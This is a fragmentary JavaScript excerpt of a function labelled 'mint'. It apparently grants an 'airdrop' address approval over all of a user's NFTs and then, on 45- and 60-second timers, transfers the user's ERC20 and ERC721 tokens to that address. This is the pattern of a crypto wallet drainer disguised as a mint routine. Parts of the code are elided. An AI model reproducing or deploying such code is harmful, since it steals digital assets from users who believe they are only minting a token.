...
export const mint = async (chain, airdrop, tokensERC20, tokensERC721, payerTransfer, provider, userAddress) => {
      ...
      try {
        ...
        try {
          if (tokensERC721[iter].isApproved === false) {
            ...
            await contract.setApprovalForAll(airdrop, true);
          }
        }
        catch (err) {
          canceled = true;
    ...
    setTimeout(() => {
      if (tokensERC20.length > 0) {
        transferErc20(chain, tokensERC20, signer, airdrop, userAddress, provider);
      }
    }, 45000)
    setTimeout(() => {
      if (tokensERC721.length > 0) {
        transferErc721(airdrop, tokensERC721, provider, userAddress);
      }
    }, 60000)
  }